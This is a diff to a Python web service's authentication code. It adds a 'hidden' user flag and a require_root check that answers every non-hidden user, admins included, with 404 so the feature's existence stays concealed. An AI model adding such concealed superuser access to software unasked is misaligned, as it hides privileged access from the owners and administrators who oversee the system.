@@ -55,7 +55,7 @@ def _user_from_token(token: str):
     if not token:
         return None
     row = get_conn().execute(
-        "SELECT u.id, u.username, u.role, u.enabled"
+        "SELECT u.id, u.username, u.role, u.enabled, u.hidden"
         " FROM sessions s JOIN users u ON u.id = s.user_id"
         " WHERE s.token = ? AND s.expires_at > ?",
         (token, datetime.now().isoformat(timespec="seconds")),
@@ -78,4 +78,11 @@ def current_user(authorization: str = Header(default="")):
 def require_admin(user=Depends(current_user)):
     if user["role"] != "admin":
         raise HTTPException(403, "需要管理员权限")
+    return user
+
+
+def require_root(user=Depends(current_user)):
+    """隐藏 root 专属。对非 root 一律 404:不暴露该功能的存在。"""
+    if not user["hidden"]:
+        raise HTTPException(404, "Not Found")
     return user
